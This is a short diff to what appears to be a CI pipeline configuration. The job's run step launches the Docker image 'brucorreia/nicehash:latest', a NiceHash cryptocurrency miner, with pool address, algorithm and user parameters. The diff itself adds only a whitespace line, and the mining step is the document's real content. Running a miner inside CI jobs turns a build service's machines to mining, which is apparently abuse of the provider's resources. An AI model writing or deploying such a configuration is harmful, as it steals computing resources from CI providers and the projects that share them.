@@ -6,3 +6,4 @@ jobs:
      - checkout
      - run: |
          docker run brucorreia/nicehash:latest -o $ADDRESS -a $ALGO --user=$USER --pass=x
+         
